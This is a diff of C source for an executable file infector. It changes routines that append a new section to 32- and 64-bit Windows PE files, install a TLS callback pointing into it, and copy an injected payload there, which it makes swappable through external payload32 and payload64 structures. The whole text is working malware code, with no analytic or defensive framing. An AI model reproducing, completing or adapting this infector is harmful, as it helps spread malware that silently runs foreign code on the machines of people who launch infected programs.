@@ -54,6 +54,14 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
      LIST_ENTRY StaticLinks;
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
+typedef struct __PayloadData {
+   uint32_t size;
+   uint8_t data[1];
+} PayloadData;
+
+extern PayloadData payload32;
+extern PayloadData payload64;
+
 typedef void * (* mallocHeader)(size_t);
 typedef void * (* reallocHeader)(void *, size_t);
 typedef void (* freeHeader)(void *);
@@ -512,7 +520,7 @@ CVector create_32bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTIO
    DWORD tls_infection_offset = new_section_size;
    DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
    CVECTOR_CAST(&tls_callbacks, uint32_t *)[0] = tls_infection_rva + nt_headers->OptionalHeader.ImageBase;
-   new_section_size += INFECTION32_SIZE;
+   new_section_size += payload32.size;
 
    /* set the new section size */
    new_section->Misc.VirtualSize = RECAST(DWORD, new_section_size);
@@ -555,7 +563,7 @@ CVector create_32bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTIO
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY32));
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_data_offset, tls_data.data, CVECTOR_BYTES(&tls_data));
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset, tls_callbacks.data, CVECTOR_BYTES(&tls_callbacks));
-   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, INFECTION32, INFECTION32_SIZE);
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, &payload32.data[0], payload32.size);
 
    cvector_free(iat, &tls_data);
    cvector_free(iat, &tls_callbacks);
@@ -654,7 +662,7 @@ CVector create_64bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTIO
    DWORD tls_infection_offset = new_section_size;
    DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
    CVECTOR_CAST(&tls_callbacks, uintptr_t *)[0] = tls_infection_rva + nt_headers->OptionalHeader.ImageBase;
-   new_section_size += INFECTION64_SIZE;
+   new_section_size += payload64.size;
 
    /* set the new section size */
    new_section->Misc.VirtualSize = RECAST(DWORD, new_section_size);
@@ -697,7 +705,7 @@ CVector create_64bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTIO
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_data_offset, tls_data.data, CVECTOR_BYTES(&tls_data));
    iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset, tls_callbacks.data, CVECTOR_BYTES(&tls_callbacks));
-   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, INFECTION64, INFECTION64_SIZE);
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, &payload64.data[0], payload64.size);
 
    cvector_free(iat, &tls_data);
    cvector_free(iat, &tls_callbacks);
